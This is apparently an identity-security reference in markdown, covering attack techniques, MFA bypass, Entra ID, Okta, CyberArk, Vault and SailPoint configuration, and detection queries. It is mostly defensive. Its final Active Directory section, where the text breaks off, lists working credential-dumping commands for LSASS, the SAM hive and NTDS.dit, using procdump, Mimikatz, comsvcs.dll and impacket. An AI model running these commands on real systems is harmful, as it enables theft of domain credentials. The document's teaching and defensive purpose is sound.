# Identity Security Reference

> A comprehensive vendor-specific, technique-mapped reference for identity
> security architecture, attack techniques, detection engineering, and
> compliance — covering Microsoft Entra ID, Okta, Active Directory, CyberArk,
> HashiCorp Vault, SailPoint, and more.

---

## Table of Contents

1. [Identity Attack Surface](#1-identity-attack-surface)
2. [Authentication Deep Dive](#2-authentication-deep-dive)
3. [MFA Bypass Techniques & Defenses](#3-multi-factor-authentication--bypass-techniques--defenses)
4. [Microsoft Entra ID (Azure AD)](#4-microsoft-entra-id-azure-ad--vendor-specific-controls)
5. [Privileged Access Management (PAM)](#5-privileged-access-management-pam)
6. [Identity Governance & Administration (IGA)](#6-identity-governance--administration-iga)
7. [Okta — Vendor-Specific Controls](#7-okta--vendor-specific-controls)
8. [Active Directory Identity Attacks](#8-active-directory-identity-attacks-deep-dive)
9. [Service Accounts & Non-Human Identities](#9-service-accounts--non-human-identities)
10. [Identity Detection & Response](#10-identity-detection--response)
11. [Zero Trust Identity Principles](#11-zero-trust-identity-principles)
12. [Compliance & Frameworks](#12-compliance--frameworks)

---

## 1. Identity Attack Surface

### Identity Is the New Perimeter

Modern infrastructure has dissolved the traditional network perimeter. Cloud
adoption, remote work, and SaaS proliferation mean that **identity is now the
primary control plane** for access decisions. According to the **Verizon 2024
Data Breach Investigations Report (DBIR)**:

- **74 %** of all breaches involve a human element (credentials, privilege
  abuse, social engineering, or error)
- **86 %** of web application attacks use stolen credentials
- Credential theft is the #1 initial access vector in ransomware incidents
- Identity-based attacks take an average of **287 days** to detect and contain
  (IBM Cost of a Data Breach 2024)

### Attack Taxonomy

| Category | Description | ATT&CK Technique |
|---|---|---|
| Credential theft | Harvesting plaintext or hashed credentials from memory, disk, or network | T1078, T1110, T1003 |
| MFA bypass | AiTM proxies, push fatigue, SIM swapping, OTP interception | T1621, T1556.006 |
| Token theft | Stealing OAuth/SAML/Kerberos tokens post-authentication | T1539, T1550, T1558 |
| IdP attacks | Compromising the identity provider itself (AAD, Okta, AD FS) | T1556, T1484 |
| Privilege escalation | Moving from low-privilege to admin within the IdP or directory | T1078.004, T1134 |

### MITRE ATT&CK Identity Techniques

| Technique | Name | Tactic |
|---|---|---|
| T1078 | Valid Accounts | Initial Access, Persistence, Privilege Escalation |
| T1078.001 | Default Accounts | Initial Access |
| T1078.002 | Domain Accounts | Persistence |
| T1078.004 | Cloud Accounts | Persistence, Privilege Escalation |
| T1110 | Brute Force | Credential Access |
| T1110.001 | Password Guessing | Credential Access |
| T1110.003 | Password Spraying | Credential Access |
| T1110.004 | Credential Stuffing | Credential Access |
| T1556 | Modify Authentication Process | Credential Access, Defense Evasion |
| T1556.006 | Multi-Factor Authentication | Credential Access |
| T1558 | Steal or Forge Kerberos Tickets | Credential Access |
| T1558.003 | Kerberoasting | Credential Access |
| T1558.004 | AS-REP Roasting | Credential Access |
| T1621 | Multi-Factor Authentication Request Generation | Credential Access |
| T1539 | Steal Web Session Cookie | Credential Access |
| T1550 | Use Alternate Authentication Material | Defense Evasion, Lateral Movement |
| T1550.001 | Application Access Token | Defense Evasion |
| T1550.002 | Pass the Hash | Defense Evasion, Lateral Movement |
| T1550.003 | Pass the Ticket | Defense Evasion, Lateral Movement |

---

## 2. Authentication Deep Dive

### Password Attacks & Defenses

#### Brute Force (T1110.001)
An attacker systematically tries all possible passwords until the correct one
is found.

**Defenses:**
- **Account lockout policy**: Lock after 5–10 failed attempts, 15-minute
  observation window (CIS Benchmark recommendation)
- **Smart lockout (Entra ID)**: Locks accounts for 60 s after 10 failures;
  duration doubles per subsequent failure; separate tracking per location
  (`az ad sp show` or portal → Security → Authentication methods)
- **CAPTCHA** after N failed attempts

#### Credential Stuffing (T1110.004)
Uses username/password pairs from public breaches (e.g., HIBP datasets) to
gain access to accounts where users reuse passwords.

**Defenses:**
- **Breached password detection**: Microsoft Entra → Authentication methods →
  Password protection → "Enforce custom banned passwords list"
- **HIBP integration** (Okta, 1Password, etc.)
- Require unique passwords per service; mandate password manager adoption

#### Password Spraying (T1110.003)
Tests one or few common passwords against many accounts to avoid lockout
(one-to-many vs brute force many-to-one).

**Common passwords targeted:** `Summer2024!`, `Welcome1`, `Password1`,
`[Company]2024`

**Defenses:**
- Entra ID Smart Lockout (separate spray detection thresholds)
- Identity Protection — "Password spray" risk detection
- Disable legacy auth protocols that bypass modern lockout controls

---

### MFA Types Comparison

| Type | Protocol/Standard | Phishing Resistant | Example Products |
|---|---|---|---|
| TOTP (Time-based OTP) | RFC 6238 (HMAC-SHA1, 30s window) | No | Google Authenticator, Authy, Microsoft Authenticator |
| HOTP (Counter-based OTP) | RFC 4226 | No | Hardware tokens (old RSA SecurID) |
| SMS OTP | Carrier SMS | No | Most consumer banks |
| Push notification | Proprietary | No | Duo Push, Microsoft Authenticator push, Okta Verify |
| FIDO2 / WebAuthn (Passkeys) | W3C WebAuthn + CTAP2 | **Yes** | YubiKey 5, passkeys in iOS/Android/Windows |
| Hardware token (FIDO2) | CTAP2 | **Yes** | YubiKey 5 NFC, FEITIAN ePass |
| Hardware token (YubiKey OTP) | Yubico OTP (AES-128) | No (replay-proof but not phishing-resistant) | YubiKey 5 |
| Certificate-based (CBA) | X.509 / TLS client cert | **Yes** | Smart cards, PIV, CAC |
| Windows Hello for Business | TPM-backed FIDO2 | **Yes** | Windows 10/11 enterprise |

---

### FIDO2/WebAuthn Deep Dive

**Authenticator Assertion Flow:**
1. Relying Party (RP) sends a `challenge` (random 32-byte nonce)
2. Authenticator (device TPM / security key) signs the challenge using the
   private key bound to that RP origin
3. `authenticatorData` (rpIdHash + flags + counter + AAGUID) + `clientDataJSON`
   + signature are returned
4. Server verifies: correct origin, challenge matches, counter > previous
   counter (replay prevention), signature valid

**Resident Keys vs Server-Side Credentials:**

| | Resident Keys (Discoverable) | Server-Side Credentials |
|---|---|---|
| Key stored on | Authenticator | Server (credential ID only) |
| Username required at login | No (username-less flow) | Yes |
| Storage limit | ~25 keys (YubiKey 5) | Unlimited |
| Use case | Passkeys, passwordless | Traditional WebAuthn + MFA step-up |

**Attestation Types:**
- `none` — no attestation; RP cannot verify authenticator model
- `self` — signed by authenticator key itself; limited assurance
- `packed` — most common; signed by AAGUID-specific cert chain
- `tpm` — TPM-attested (Windows Hello, enterprise grade)
- `android-key` — Android hardware-backed
- `fido-u2f` — legacy U2F format
- `apple` — Apple Secure Enclave attestation

---

### Passkeys

**Synced Passkeys** (e.g., iCloud Keychain, Google Password Manager):
- Discoverable credential synced across devices via encrypted cloud backup
- Threat: cloud account compromise can expose all passkeys
- FIDO Alliance guidance: treat synced passkeys as AAL2 (not AAL3)

**Device-Bound Passkeys:**
- Credential never leaves the device (hardware-backed, YubiKey, TPM)
- Lost device = lost credential; requires recovery flow
- Suitable for AAL3 / high-assurance use cases

**PRF Extension (Pseudo-Random Function):**
- Allows WebAuthn credential to derive deterministic key material
- Used for end-to-end encryption keying (e.g., 1Password passkeys)
- Requires `prf` extension in `create()` / `get()` calls

---

### Passwordless Architectures

**Windows Hello for Business (WHfB):**
- Enrolls a TPM-bound asymmetric key pair per device per user
- Authentication: device TPM signs IdP challenge (no password ever sent)
- Deployment modes: Key Trust (requires line-of-sight DC), Certificate Trust,
  Cloud Trust (hybrid — requires Entra Kerberos)
- Requires: Windows 10 1703+, TPM 1.2+ (2.0 preferred), Entra ID or Hybrid
  Entra joined

**Microsoft Authenticator Passwordless:**
- Phone sign-in: push + biometric/PIN
- Behind the scenes: asymmetric key pair stored in phone secure enclave
- Conditional Access: compatible as a phishing-resistant factor with
  Authentication Strengths policy (Entra P2)

---

## 3. Multi-Factor Authentication — Bypass Techniques & Defenses

### AiTM (Adversary-in-the-Middle)

**Attack Flow (EvilGinx2 / Modlishka):**
1. Attacker registers phish domain (e.g., `login-microsoft-secure[.]com`)
2. Reverse proxy (EvilGinx2) sits between victim and legitimate IdP
3. Victim completes full MFA — all credentials AND session cookies pass through
   proxy
4. Attacker replays session cookie to authenticate as victim
   (token lifetime varies: O365 default = 1 hour for access token,
   14–90 days for refresh token)

**Real Incidents:**
- **Storm-0867 (2023)**: AiTM campaign targeting 10,000+ M365 organizations
- **DEV-0537 (Lapsus$, 2022)**: Combined AiTM with MFA fatigue

**Microsoft Entra Detection Signals:**
- Sign-in risk: `Token issuer anomaly`
- Sign-in risk: `Unfamiliar sign-in properties`
- `anonymizedIPAddress` risk detection when proxied through Tor
- Sentinel KQL:
  ```kql
  SigninLogs
  | where RiskEventTypes has "tokenIssuerAnomaly"
     or RiskEventTypes has "unfamiliarFeatures"
  | where ResultType == 0
  | project TimeGenerated, UserPrincipalName, IPAddress,
            AppDisplayName, RiskEventTypes, RiskLevelDuringSignIn
  ```

**Defenses:**
- **Conditional Access + Token Protection** (Entra P2): binds token to device
  TPM; replayed token on different device is rejected
- **CAE (Continuous Access Evaluation)**: IdP pushes revocation events in
  near-real-time to resource providers (Exchange, SharePoint, Teams)
- Require FIDO2/passkeys instead of push MFA (eliminates session hijack surface)
- Named locations: block sign-ins from unexpected countries

---

### MFA Fatigue / Push Bombing (T1621)

**Technique:** Attacker with stolen credentials sends repeated push MFA
requests, hoping victim approves accidentally or out of frustration.

**Real Incident — Uber 2022:**
- Attacker obtained contractor credentials via dark web
- Sent ~20 push notifications; victim did not approve
- Attacker then contacted victim via WhatsApp claiming to be IT support,
  asking victim to approve the next push
- Victim approved; attacker gained full access including Thycotic PAM, GSuite,
  Slack, AWS

**Defenses:**
- **Number matching** (Microsoft Authenticator): app displays a 2-digit number;
  user must enter it on the authenticator — prevents blind approval
  - Policy path: Entra → Authentication methods → Microsoft Authenticator →
    Number matching = Enabled
- **Additional context**: shows app name, geographic location in push
- **FIDO2 / passkeys**: eliminates push entirely
- **Okta Verify number challenge**: same number-matching concept
- Rate-limit push attempts: Entra Identity Protection blocks after N sequential
  push denials

---

### SIM Swapping

**Attack Flow:**
1. Attacker uses OSINT / social engineering to gather victim's carrier account
   info
2. Social engineers carrier support to transfer phone number to attacker's SIM
3. All SMS OTP and phone calls for that number now received by attacker

**SS7 Exploitation:**
- BGP/SS7 protocol weaknesses allow nation-state actors to reroute SMS at the
  network level without social engineering carrier
- CVE-equivalent: SS7 MAP protocol `sendRoutingInfoForSM` attack

**Defenses:**
- Replace SMS MFA with authenticator app or hardware token
- Carrier SIM lock / port freeze
- Account takeover protection: many carriers offer PIN-protected SIM changes

---

### OTP Interception

**Reverse proxy**: same as AiTM — proxy forwards OTP entered by victim to
legitimate site before it expires

**Malware**: keyloggers or browser extensions intercept OTP as typed

**Defenses:** FIDO2 (cryptographically bound to origin — proxy cannot relay)

---

### Recovery Method Abuse

- Email-based MFA recovery: attacker who controls victim's email can bypass MFA
- Backup codes: leaked or stolen backup codes allow full MFA bypass
- Admin override: helpdesk social engineering to bypass MFA for "locked out"
  users

**Defenses:**
- Restrict self-service password reset (SSPR) to require MFA challenge
  (Entra: Authentication methods → SSPR → Require registration at sign-in)
- Limit backup codes to FIDO2 hardware only
- Helpdesk verification identity protocol (knowledge factors + manager approval)

---

## 4. Microsoft Entra ID (Azure AD) — Vendor-Specific Controls

### Conditional Access Policies

**Require MFA for All Users (Template):**
```json
{
  "displayName": "CA001 - Require MFA for All Users",
  "state": "enabled",
  "conditions": {
    "users": { "includeUsers": ["All"], "excludeGroups": ["<BreakGlassGroupId>"] },
    "applications": { "includeApplications": ["All"] },
    "clientAppTypes": ["all"]
  },
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["mfa"]
  }
}
```

**Require Compliant Device (Intune):**
```json
{
  "displayName": "CA002 - Require Compliant Device for M365",
  "conditions": {
    "users": { "includeUsers": ["All"] },
    "applications": { "includeApplications": ["Office365"] }
  },
  "grantControls": {
    "operator": "AND",
    "builtInControls": ["mfa", "compliantDevice"]
  }
}
```

**Block Legacy Authentication:**
```json
{
  "displayName": "CA003 - Block Legacy Authentication",
  "conditions": {
    "clientAppTypes": ["exchangeActiveSync", "other"]
  },
  "grantControls": {
    "operator": "OR",
    "builtInControls": ["block"]
  }
}
```

**Sign-In Risk-Based Policy:**
```json
{
  "displayName": "CA004 - MFA on Medium+ Sign-In Risk",
  "conditions": {
    "signInRiskLevels": ["medium", "high"]
  },
  "grantControls": { "builtInControls": ["mfa"] }
}
```

**User Risk-Based Policy:**
```json
{
  "displayName": "CA005 - Require Password Change on High User Risk",
  "conditions": {
    "userRiskLevels": ["high"]
  },
  "grantControls": {
    "operator": "AND",
    "builtInControls": ["mfa", "passwordChange"]
  }
}
```

**Named Location Definition (Trusted HQ):**
```json
{
  "displayName": "HQ - Corporate IP Range",
  "@odata.type": "#microsoft.graph.ipNamedLocation",
  "isTrusted": true,
  "ipRanges": [
    { "@odata.type": "#microsoft.graph.iPv4CidrRange", "cidrAddress": "203.0.113.0/24" }
  ]
}
```

---

### Identity Protection Risk Detections

| Risk Detection | Category | Description |
|---|---|---|
| Leaked credentials | User risk | Password found in public breach dataset |
| Anonymous IP address | Sign-in risk | Sign-in from Tor exit node or anonymizing proxy |
| Atypical travel | Sign-in risk | Two sign-ins from geo-distant locations in impossible time |
| Malware-linked IP address | Sign-in risk | IP associated with known botnet C2 |
| Unfamiliar sign-in properties | Sign-in risk | New location, device, or ASN for this user |
| Password spray | Sign-in risk | Multiple accounts sprayed from same IP |
| Impossible travel | Sign-in risk | Physical impossibility based on travel speed |
| Suspicious inbox manipulation rules | User risk | Rules forwarding email externally (BEC indicator) |
| Token issuer anomaly | Sign-in risk | Token presented from unexpected issuer (AiTM indicator) |

---

### Microsoft Entra ID Protection PowerShell (Microsoft.Graph)

```powershell
# Install required modules
Install-Module Microsoft.Graph.Identity.SignIns -Scope CurrentUser
Install-Module Microsoft.Graph.Identity.Governance -Scope CurrentUser

# Connect
Connect-MgGraph -Scopes "IdentityRiskyUser.Read.All",
                         "Policy.Read.All",
                         "Policy.ReadWrite.ConditionalAccess"

# List high-risk users
Get-MgRiskyUser -Filter "riskLevel eq 'high'" |
    Select-Object UserPrincipalName, RiskLevel, RiskState, RiskLastUpdatedDateTime

# Confirm a user as compromised
Invoke-MgConfirmIdentityRiskyUserCompromised -UserIds "<userId>"

# Dismiss user risk
Invoke-MgDismissRiskyUser -UserIds "<userId>"

# List Conditional Access policies
Get-MgIdentityConditionalAccessPolicy |
    Select-Object DisplayName, State, Id | Sort-Object DisplayName

# Enable MFA registration policy (Authentication methods)
$policy = Get-MgPolicyAuthenticationMethodPolicy
# Set FIDO2 to enabled
Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration `
    -AuthenticationMethodConfigurationId "fido2" `
    -IsRegistrationRequired $true

# Block legacy auth — check Named Locations
Get-MgIdentityConditionalAccessNamedLocation | Select-Object DisplayName, Id

# Export risky sign-ins (last 30 days)
$start = (Get-Date).AddDays(-30).ToString("yyyy-MM-ddTHH:mm:ssZ")
Get-MgAuditLogRiskySignIn -Filter "createdDateTime ge $start" |
    Export-Csv risky_signins.csv -NoTypeInformation
```

---

### PIM (Privileged Identity Management)

**Just-In-Time (JIT) Activation Flow:**
1. User opens Entra PIM portal or runs `az role assignment create --justification`
2. User provides business justification (required if configured)
3. Approver receives email/Teams notification (if approval workflow enabled)
4. Role activated for configured duration (1–24 hours, default 1 h)
5. All activation events logged to PIM audit log + Sentinel

**PIM Role Settings (per-role configuration):**
```
Activation maximum duration: 4 hours
Require MFA on activation: Yes
Require justification on activation: Yes
Require approval to activate: Yes (Global Admin, Privileged Role Admin)
Assignment expiration: eligible assignments expire in 180 days
Active assignment expiration: active assignments expire in 1 day
Send notifications: to role activations
Require Azure AD Conditional Access authentication context: CAx-PIM
```

**Access Reviews:**
```powershell
# Create an access review for Global Admins
$reviewScope = @{
    principalScopes = @(@{ "@odata.type" = "#microsoft.graph.principalResourceMembershipsScope" })
    resourceScopes  = @(@{ query = "/roleManagement/directory/roleDefinitions/<GlobalAdminRoleId>" })
}
New-MgIdentityGovernanceAccessReviewDefinition `
    -DisplayName "Quarterly Global Admin Review" `
    -Scope $reviewScope `
    -Settings @{
        instanceDurationInDays    = 30
        recurrence                = @{ pattern = @{ type = "monthly"; interval = 3 } }
        defaultDecision           = "Deny"
        autoApplyDecisionsEnabled = $true
    }
```

---

### External Identities & Cross-Tenant Access

**B2B Guest Access Controls:**
- Tenant → External Identities → External collaboration settings
- Guest user access: "Guest users have limited access to properties and
  memberships of directory objects" (recommended)
- Restrict invitation to specific domains: `allowedDomains` list

**Cross-Tenant Access Policy (XTAP):**
```json
{
  "tenantId": "<partnerTenantId>",
  "inboundTrust": {
    "isMfaAccepted": true,
    "isCompliantDeviceAccepted": true,
    "isHybridAzureADJoinedDeviceAccepted": false
  },
  "b2bCollaborationInbound": {
    "usersAndGroups": { "accessType": "allowed", "targets": [{ "targetType": "group", "target": "<AllowedGroupId>" }] }
  }
}
```

---

### Entra ID Protection KQL — Azure Sentinel Detections

```kql
// AiTM token anomaly with successful sign-in
SigninLogs
| where TimeGenerated > ago(1d)
| where RiskEventTypes_V2 has_any ("tokenIssuerAnomaly", "unfamiliarFeatures")
| where ConditionalAccessStatus == "success"
| project TimeGenerated, UserPrincipalName, AppDisplayName,
          IPAddress, Location, RiskLevelDuringSignIn, RiskEventTypes_V2

// Impossible travel (manual)
let threshold_minutes = 60;
SigninLogs
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, IPAddress,
          Latitude = toreal(LocationDetails.geoCoordinates.latitude),
          Longitude = toreal(LocationDetails.geoCoordinates.longitude)
| sort by UserPrincipalName, TimeGenerated asc
| extend prev_time = prev(TimeGenerated, 1),
         prev_lat = prev(Latitude, 1),
         prev_lon = prev(Longitude, 1),
         prev_user = prev(UserPrincipalName, 1)
| where UserPrincipalName == prev_user
| extend minutes_diff = datetime_diff('minute', TimeGenerated, prev_time)
| extend distance_km = geo_distance_2points(Longitude, Latitude, prev_lon, prev_lat) / 1000
| where minutes_diff < threshold_minutes and distance_km > 500
| project TimeGenerated, UserPrincipalName, IPAddress, distance_km, minutes_diff
```

---

## 5. Privileged Access Management (PAM)

### CyberArk — Policy Settings

#### Safe Permissions

| Permission | Description |
|---|---|
| Use | Connect through PSM to the account (no password retrieval) |
| Retrieve | Retrieve the password (shown or copied) |
| List | View the account name in the safe |
| Add | Add new accounts to the safe |
| Update | Update account properties and password value |
| Rename | Rename the account object |
| Delete | Delete accounts from the safe |
| Unlock | Unlock a locked account |
| Initiate CPM change | Trigger immediate password rotation via CPM |
| View Audit | See full audit trail for the safe |
| Manage Safe | Modify safe settings and member permissions |

#### Master Policy Settings (recommended enterprise baseline)

```
Require dual control password access approval: YES
Enforce check-in/check-out exclusive access: YES
Enforce one-time password use: YES
Allow EPV transparent connections: YES (PSM only)
Require reason for access: YES
Minimum validity period: 1 hour
Maximum validity period: 8 hours
Require dual control for: Retrieve
```

#### CPM (Central Policy Manager) — Password Rotation

```
Password change interval: 90 days (CIS recommendation)
Immediate change on check-in: YES
Complexity: 14+ chars, mixed case, digits, specials
Retry interval on failure: 60 minutes
Max retries: 5
Notification on failure: pagerduty@corp.com
```

#### CyberArk REST API Examples

```bash
# Authenticate
curl -X POST https://cyberark.corp.com/PasswordVault/API/auth/CyberArk/Logon \
  -H "Content-Type: application/json" \
  -d '{"username":"apiuser","password":"P@ssw0rd!","concurrentSession":false}'
# Returns: {"CyberArkLogonResult": "<token>"}

# List accounts in a safe
curl -X GET "https://cyberark.corp.com/PasswordVault/api/Accounts?safeName=Production-Linux" \
  -H "Authorization: <token>"

# Retrieve password (triggers audit event)
curl -X GET "https://cyberark.corp.com/PasswordVault/api/Accounts/<accountId>/Password/Retrieve" \
  -H "Authorization: <token>"

# Initiate immediate CPM password change
curl -X POST "https://cyberark.corp.com/PasswordVault/api/Accounts/<accountId>/Change" \
  -H "Authorization: <token>" \
  -H "Content-Type: application/json" \
  -d '{"ChangeEntireGroup":false}'
```

---

### HashiCorp Vault

#### Auth Methods

| Method | Use Case | CLI Command |
|---|---|---|
| AppRole | Applications/automation | `vault write auth/approle/login role_id=... secret_id=...` |
| AWS IAM | AWS workloads (EC2, Lambda) | `vault login -method=aws role=my-role` |
| Kubernetes | K8s pods via service account JWT | `vault write auth/kubernetes/login role=myapp jwt=<sa-token>` |
| LDAP | Corporate AD/LDAP users | `vault login -method=ldap username=alice` |
| OIDC | SSO / Entra ID / Okta | `vault login -method=oidc` |
| GitHub | Developer personal access tokens | `vault login -method=github token=<PAT>` |

#### Secret Engines

```bash
# Enable KV v2
vault secrets enable -path=secret kv-v2

# Write/read a secret
vault kv put secret/myapp/config db_password=S3cr3t!
vault kv get -field=db_password secret/myapp/config

# Enable PKI engine
vault secrets enable pki
vault secrets tune -max-lease-ttl=87600h pki
vault write pki/root/generate/internal \
  common_name="Corp Root CA" ttl=87600h

# Enable dynamic database credentials (PostgreSQL)
vault secrets enable database
vault write database/config/postgres \
  plugin_name=postgresql-database-plugin \
  allowed_roles=readonly \
  connection_url="postgresql://{{username}}:{{password}}@postgres:5432/mydb" \
  username=vaultadmin password=vaultadmin

vault write database/roles/readonly \
  db_name=postgres \
  creation_statements="CREATE ROLE \"{{name}}\" WITH LOGIN PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \"{{name}}\";" \
  default_ttl=1h max_ttl=24h

# Retrieve dynamic credentials
vault read database/creds/readonly
```

#### Vault Policies (HCL)

```hcl
# policy: readonly-secrets
path "secret/data/myapp/*" {
  capabilities = ["read", "list"]
}

path "secret/metadata/myapp/*" {
  capabilities = ["list"]
}

# Deny all else
path "*" {
  capabilities = ["deny"]
}

# Policy: pki-issue
path "pki/issue/webserver" {
  capabilities = ["create", "update"]
}

path "pki/certs" {
  capabilities = ["list"]
}
```

#### Transit Engine (Encryption-as-a-Service)

```bash
vault secrets enable transit
vault write -f transit/keys/myapp-key

# Encrypt
vault write transit/encrypt/myapp-key \
  plaintext=$(echo -n "sensitive-data" | base64)
# Returns: ciphertext = vault:v1:8SDd3WHDOjf...

# Decrypt
vault write transit/decrypt/myapp-key \
  ciphertext="vault:v1:8SDd3WHDOjf..."
# Returns: plaintext (base64-encoded)

# Rotate key
vault write -f transit/keys/myapp-key/rotate
# Old ciphertext still decryptable; new encryptions use latest key version
```

#### Vault Agent — Kubernetes Sidecar

```yaml
# vault-agent-config.hcl
auto_auth {
  method "kubernetes" {
    mount_path = "auth/kubernetes"
    config     = { role = "myapp" }
  }
  sink "file" {
    config = { path = "/home/vault/.vault-token" }
  }
}

template {
  source      = "/etc/vault/templates/db-config.ctmpl"
  destination = "/etc/secrets/db-config.txt"
}
```

---

### PAM Architecture Best Practices

- **Break-glass accounts**: Two accounts per org (one per admin) stored in
  CyberArk, MFA-protected, alerting on any use, reviewed quarterly
- **Service account vaulting**: ALL service account passwords managed via CPM;
  zero human knowledge of actual password value
- **SSH Certificate Authorities**: Vault CA issues short-lived SSH certs (1-h
  TTL) instead of distributing public keys; eliminates SSH key sprawl
  ```bash
  vault write ssh-client-signer/sign/myrole \
    public_key=@~/.ssh/id_rsa.pub valid_principals=ubuntu
  ```

---

## 6. Identity Governance & Administration (IGA)

### SailPoint IIQ / IdentityNow

#### Certification Campaigns

| Campaign Type | Description | Typical Frequency |
|---|---|---|
| User access review | Manager certifies all entitlements for direct reports | Quarterly |
| Entitlement owner certification | Entitlement owners certify who has access | Semi-annual |
| Application owner certification | App owners review all users in application | Annual |
| Role composition certification | Role owners certify role entitlements | Annual |

**Campaign Configuration (IdentityNow API):**
```json
{
  "name": "Q2-2024 Manager Certification",
  "type": "Manager",
  "campaignFilter": { "type": "ROLE_LIST" },
  "recommendationsEnabled": true,
  "deadlineDuration": "P14D",
  "reminderConfiguration": {
    "cronExpression": "0 8 * * MON",
    "reminderDuration": "P7D"
  },
  "requiredCertifiers": ["Manager"]
}
```

#### Joiner/Mover/Leaver Workflows

```
JOINER:
  Trigger: HR new hire event
  Actions:
    1. Create AD account (OU based on department)
    2. Assign base role (Employee-Base)
    3. Provision M365 license
    4. Send welcome email with onboarding links
    5. Notify manager

MOVER:
  Trigger: HR transfer event
  Actions:
    1. Remove source department entitlements after 30-day grace
    2. Assign target department base role
    3. Request re-certification of carried-over access

LEAVER:
  Trigger: HR termination event
  Actions:
    1. Disable AD account (T+0 hours — immediate)
    2. Revoke all active sessions (M365 revoke token)
    3. Remove all group memberships (T+1 hour)
    4. Reassign owned resources to manager
    5. Disable after 30 days; delete after 90 days
    6. Archive inbox → manager for 90 days
```

#### SOD (Separation of Duties)

```
SOD Rule: Accounts Payable + Accounts Receivable
  Conflicting entitlement A: SAP_AP_APPROVER
  Conflicting entitlement B: SAP_AR_APPROVER
  Risk level: HIGH
  Action: Block provisioning, require CISO approval override
  Remediation: Remove oldest entitlement if violation found

SOD Rule: Code Commit + Production Deploy
  Conflicting entitlement A: GitHub-Org-Write
  Conflicting entitlement B: GitHub-Actions-ProducationDeploy
  Risk level: MEDIUM
  Action: Flag for review within 7 days
```

---

### IGA Key Metrics

| Metric | Target | Red Threshold |
|---|---|---|
| Orphaned account rate | < 1 % | > 5 % |
| Excessive privilege percentage | < 10 % | > 25 % |
| Certification completion rate | > 95 % | < 80 % |
| Time-to-deprovision (leaver) | < 4 hours | > 24 hours |
| Time-to-provision (joiner) | < 1 business day | > 3 business days |
| SOD violation rate | < 0.5 % | > 2 % |
| Unreviewed entitlements > 90 days | 0 | > 1 % |

---

### Saviynt

**Application Access Governance:**
- Connect app via SCIM 2.0 or connector framework
- Map app roles to Saviynt entitlements
- Configure risk scoring per entitlement (1–10 scale)

**SOD Ruleset:**
```
Ruleset: Finance Controls SOD
Rule: AP_AR_Conflict
  Entitlement 1: SAP_AP* (wildcard match)
  Entitlement 2: SAP_AR* (wildcard match)
  Risk Score: 9 (Critical)
  Control Type: Preventive
  Action: Block and notify Security team
```

---

## 7. Okta — Vendor-Specific Controls

### Okta Sign-On Policy / Global Session Policy

**Global Session Policy (Organization-level):**
```
Policy name: Default Policy
Rules (in evaluation order):
  Rule 1: Employees – Low Risk
    Conditions: User in group "Employees", risk = low
    Session lifetime: 8 hours
    Re-authentication: every 4 hours

  Rule 2: Employees – High Risk
    Conditions: risk = high OR unknown
    Session: terminate (require fresh sign-in)
```

**MFA Enrollment Policy:**
```
Policy name: Employee MFA Enrollment
Eligible authenticators:
  - Okta Verify (required)
  - FIDO2 (WebAuthn) (optional)
  - Google Authenticator (optional)
  - Security key or biometric (optional)
Enforcement: REQUIRED (block access until enrolled)
Target group: All Employees
```

**App Sign-On Policy (per-app rule):**
```
Rule: Require Phishing-Resistant MFA for Admin Console
  IF user is in group "Okta-Admins"
  AND access is from outside network zone "Corporate-IP"
  THEN require authenticator: Security key or biometric (FIDO2)
  AND session max: 1 hour
```

---

### Okta ThreatInsight

```
Mode: Log and enforce (block)
Suspicious IPs: IP reputation from Okta's global threat intelligence
Additional sources: Custom IP denylist

API to add IP to denylist:
POST /api/v1/threats/configuration
{
  "action": "BLOCK",
  "excludeZones": ["corp-ip-zone"]
}
```

---

### Okta FastPass & Number Challenge

**Okta FastPass (device-bound passkey):**
- Credential bound to Okta Verify on enrolled device
- Requires Okta Identity Engine (OIE)
- Enables passwordless sign-in with biometric + device trust
- Combine with device management (Jamf, Intune) for full Zero Trust

**Number Challenge:**
```
Okta Admin Console →
  Security → Authenticators → Okta Verify →
    Enable "Number Challenge"
```
- Presents 3-digit number on browser; user must tap matching number in app
- Defeats push fatigue entirely

---

### Okta System Log Event Types for Detection

| Event Type | Description |
|---|---|
| `user.authentication.sso` | Successful SSO to any app |
| `user.session.start` | New Okta session established |
| `user.mfa.factor.challenge` | MFA challenge initiated |
| `user.mfa.factor.challenge.success` | MFA passed |
| `user.mfa.factor.challenge.fail` | MFA failed |
| `security.threat.detected` | ThreatInsight blocked a sign-in |
| `user.account.lock` | Account locked due to failed attempts |
| `user.session.end` | Session expired or user signed out |
| `policy.evaluate_sign_on` | Policy engine evaluated (useful for CA analysis) |
| `user.mfa.factor.update` | MFA factor changed (watch for unauthorized updates) |
| `group.user_membership.add` | User added to group |
| `application.user_membership.add` | User assigned to app |

**Okta System Log KQL equivalent (for Sentinel via Okta connector):**
```kql
OktaSSO
| where eventType == "user.authentication.sso"
    and outcome_result == "FAILURE"
| summarize FailCount = count() by actor_alternateId, bin(TimeGenerated, 5m)
| where FailCount > 10
| project TimeGenerated, actor_alternateId, FailCount
```

---

### Okta Workflows

Okta Workflows (no-code automation) use cases:
- Auto-deprovision users on HR termination signal
- Escalate high-risk sign-ins to Slack security channel
- Sync group membership from Workday to Okta in real time
- Create Jira ticket for access request exceeding threshold
- Weekly orphaned account report via email

---

## 8. Active Directory Identity Attacks (Deep Dive)

### Credential Extraction

#### LSASS Dump (T1003.001)

```powershell
# Task Manager: right-click lsass.exe → "Create dump file"
# ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz
privilege::debug
sekurlsa::logonpasswords

# comsvcs.dll (LOLBIN — no external binary needed)
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> C:\Windows\Temp\lsass.dmp full
```

#### SAM Database (T1003.002)

```cmd
# Save SAM and SYSTEM hives
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system

# Offline extraction (impacket)
impacket-secretsdump -sam sam -system system LOCAL
```

#### NTDS.dit (T1003.003)

```cmd
# ntdsutil
ntdsutil "ac i ntds" "ifm" "create full C:\NTDS_backup" q q

# VSS shadow copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\

# impacket secretsdump offline
